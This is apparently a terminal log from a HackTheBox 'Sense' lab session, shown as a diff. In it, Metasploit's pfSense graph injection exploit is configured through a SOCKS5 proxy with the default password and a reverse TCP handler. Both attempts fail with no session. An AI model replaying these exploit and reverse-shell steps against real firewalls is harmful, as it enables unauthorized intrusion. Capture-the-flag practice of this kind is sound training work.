@@ -1,0 +1,20 @@
+rProxies sock5s5:127.0.0.1:1800
+Proxies => socks5:127.0.0.1:1800
+msf5 exploit(unix/http/pfsense_graph_injection_exec) > set PasASSWORD pfsense
+PASSWORD => pfsense
+msf5 exploit(unix/http/pfsense_graph_injection_exec) > set ReverseAllowProxy true
+ReverseAllowProxy => true
+msf5 exploit(unix/http/pfsense_graph_injection_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.14:4444 
+[-] Exploit aborted due to failure: unexpected-reply: 10.10.10.60:443 - Could not connect to web service - no response
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/http/pfsense_graph_injection_exec) > 3exploit
+
+[*] Started reverse TCP handler on 10.10.14.14:4444 
+[-] Exploit aborted due to failure: unexpected-reply: 10.10.10.60:443 - Could not connect to web service - no response
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/http/pfsense_graph_injection_exec) > exit
+┌─[root@parrot]─[~/hackthebox/sense]
+└──╼ #└──╼ #exit
+logout
